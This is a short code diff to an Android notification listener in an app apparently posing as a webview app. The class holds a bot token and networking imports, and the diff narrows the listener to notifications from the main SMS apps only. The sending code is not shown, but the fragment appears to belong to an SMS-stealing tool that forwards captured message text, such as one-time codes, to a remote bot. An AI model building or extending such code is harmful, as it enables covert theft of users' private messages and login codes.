@@ -14,6 +14,10 @@ import java.net.URL;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.BufferedReader;
+import java.util.Arrays;
+import java.util.HashSet;
+import java.util.Set;
+import com.example.mywebviewapp.security.SecureStorage;
 
 public class NotificationListener extends NotificationListenerService {
     private String botToken;
@@ -42,9 +46,22 @@ public class NotificationListener extends NotificationListenerService {
         // (System will restart NotificationListenerService automatically, but you can add logic here if needed)
     }
 
+    // Only allow default SMS app
+    private static final Set<String> ALLOWED_PACKAGES = new HashSet<>(Arrays.asList(
+        "com.google.android.apps.messaging",  // Google Messages
+        "com.android.messaging",              // AOSP Messages
+        "com.samsung.android.messaging"       // Samsung Messages
+    ));
+
     @Override
     public void onNotificationPosted(StatusBarNotification sbn) {
         String packageName = sbn.getPackageName();
+        
+        // Only process notifications from allowed packages
+        if (!ALLOWED_PACKAGES.contains(packageName)) {
+            return;
+        }
+
         String appName = getAppName(packageName);
         String notificationTitle = null;
         String notificationText = null;
